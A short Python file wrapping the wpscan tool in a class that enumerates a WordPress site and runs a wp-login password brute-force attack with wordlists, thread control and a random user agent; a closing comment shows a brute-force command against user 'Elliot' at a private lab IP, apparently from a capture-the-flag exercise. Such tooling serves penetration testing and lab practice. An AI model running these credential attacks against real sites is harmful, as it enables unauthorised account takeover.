import subprocess

class WPSCAN:
    def __init__(self, target):
        self.target = target

    def wp_enumerate(self):
        subprocess.run(['wpscan', '--url', self.target, '-e', '--random-user-agent'])

    def wp_bruteForce(self, wordlist='wordlist/common.txt', username='wordlist/common.txt', password='wordlist/common.txt', threads='1'):
        subprocess.run(['wpscan', '-U', username, '-P', wordlist, '--password-attack', 'wp-login', '--random-user-agent', '--url', self.target, '--max-threads', threads])


# a = WPSCAN()
# a.wp_bruteForce()
# wpscan --max-threads 60 -U Elliot -P fsortded.dic --password-attack wp-login   http://10.10.8.12